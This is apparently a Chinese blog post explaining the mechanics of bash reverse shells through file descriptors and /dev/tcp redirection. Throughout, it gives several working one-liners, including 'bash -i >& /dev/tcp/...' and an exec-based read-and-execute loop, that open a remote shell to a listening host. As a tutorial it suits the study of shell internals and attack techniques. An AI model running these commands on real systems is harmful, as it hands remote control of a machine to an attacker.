---
title: 关于文件描述符和重定向
layout: "post"
---
众所周知，把shell的输入输出重定向到在我们监听下的端口处，就可以作为反弹shell用。  
bash有个tcp的特性，用来进行网络重定向很方便，而且bash在现在的linux环境下基本是默认都有的，所以bash反弹shell也很常用。  
但是好像讲反弹shell原理的都讲得不是很好。  
我就把我的理解写一下。  
## 从文件描述子开始
`exec 5<>/dev/tcp/xx.xx.xx.xx/xxxx`  
bash下运行上述命令创建文件描述子5打开后述tcp流。  
然后如果我们在反弹回来的端口上输入，在创建描述子的窗口进行`cat <&5`或者`cat 0<&5`。  
即：将5流的信息重定向到当前窗口的0流输入cat命令。  
结果会是返回我们在端口处输入的值，cat命令干的就是0->1的活。
这时，要做的就是将这个流当作命令执行，并将执行后的1号流和2号流重定向到我们之前建立的5号流上（本质是一样的）。有人会问，重定向到我们之前的/dev/tcp/上行不行呢？可以，但是不够优雅，exec建立的文件描述子相当于打开文件，我们应该把结果发送到我们之前打开的文件上，这样比较像一个shell，如果结果返回的时候仍然用/dev/tcp我们应该再开一个nc监听，监听返回流，这属实不够优雅。
执行命令并返回结果的方法就有很多了，只要将结果返回我们的流，就类似于一个反弹shell了。
比如：  
`cat <&5 | while read line; do $line 2>&5 >&5; done`  
方法应该是特别多  
## 关于常用的bash反弹命令
`bash -i >& /dev/tcp/x.x.x.x/port 0>&1`  
很多人的解释我感觉都不对，其实最好理解的是要明白0、1、2只是被定义成输入输出错误罢了，本质上他们还是文件描述子，那就是双向的。  
其实无论怎么样，只要把012这三条路都连到tcp上就行了，因为描述子是双向的，tcp是双向状态的，所以只要把三条路都连过去就可以了.  
比如说这种:  
`bash -i > /dev/tcp/localhost/4444 0>&1 2>&1`  
如果按照所谓的重定向来理解，根本是看不懂的，但实际上，这就是把012三个流都连到tcp上，用起来是完全没有问题的，因为是tcp是有状态双向的，文件流也是双向的。用起来是完全没有问题的，不行可以自己搭建试一试。  
把上面的符号换一换也是一样：  
`bash -i < /dev/tcp/localhost/4444 1<&0 2<&0`  
用起来也是很好用，完全没有什么影响。  
这可以随便写，只要三个流都和到一起就可以了。  
`exec 5<>/dev/tcp/127.0.0.1/4444;bash -i 0<&5 1>&5 2>&5`  
上面这种新的反弹shell，明白了原理就随便写了。  
